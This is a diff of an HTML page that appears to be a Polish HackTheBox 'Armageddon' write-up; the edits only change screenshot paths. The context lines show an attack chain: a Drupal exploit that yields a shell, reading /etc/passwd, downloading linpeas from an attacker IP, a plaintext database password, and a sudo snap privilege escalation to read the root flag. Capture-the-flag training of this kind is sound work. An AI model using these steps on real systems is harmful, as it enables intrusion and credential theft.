@@ -245,13 +245,13 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.6 <span style="color:#f92672">(</span>CentOS<span style="color:#f92672">)</span> PHP/5.4.16
 |_http-title: Welcome to  Armageddon |  Armageddon
 
-</code></pre></div><p><img loading="lazy" src="../../../public/screenshots/Pasted%20image%2020210731003718.png" alt=""  />
+</code></pre></div><p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210731003718.png" alt=""  />
 </p>
 <p>Drupal 7.56</p>
 <p>Musiałem doinstalować, żeby ruby działał poprawnie</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo gem install highline
 </code></pre></div><p>Mamy shell</p>
-<p><img loading="lazy" src="../../../public/screenshots/Pasted%20image%2020210731024512.png" alt=""  />
+<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210731024512.png" alt=""  />
 </p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">armageddon.htb&gt;&gt; cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -285,9 +285,9 @@ curl --output linpeas.sh --url http://10.10.14.63/linpeas.sh
 sh linpeas.sh 			zadziałał
 </code></pre></div><p><code>drupaluser:CQHEy@9M*m23gBVj</code></p>
 <p>dane prawdopodobnie do bazy danych</p>
-<p><img loading="lazy" src="../../../public/screenshots/Pasted%20image%2020210731221145.png" alt=""  />
+<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210731221145.png" alt=""  />
 </p>
-<p><img loading="lazy" src="../../../public/screenshots/Pasted%20image%2020210731031323.png" alt=""  />
+<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210731031323.png" alt=""  />
 </p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mysql -u drupaluser --password<span style="color:#f92672">=</span>CQHEy@9M*m23gBVj -D drupal -e <span style="color:#e6db74">&#39;show databases&#39;</span>
 </code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
@@ -340,7 +340,7 @@ User brucetherealadmin may run the following commands on armageddon:
     <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/snap install *
 
 </code></pre></div><p>Szybkie GTFOBINS</p>
-<p><img loading="lazy" src="../../../public/screenshots/Pasted%20image%2020210731224129.png" alt=""  />
+<p><img loading="lazy" src="../../../../screenshots/Pasted%20image%2020210731224129.png" alt=""  />
 </p>
 <p>Zatem tworzymy taki skrypcik, ktory wyswietli flage /root/root.txt</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">COMMAND<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;cat /root/root.txt&#39;</span>
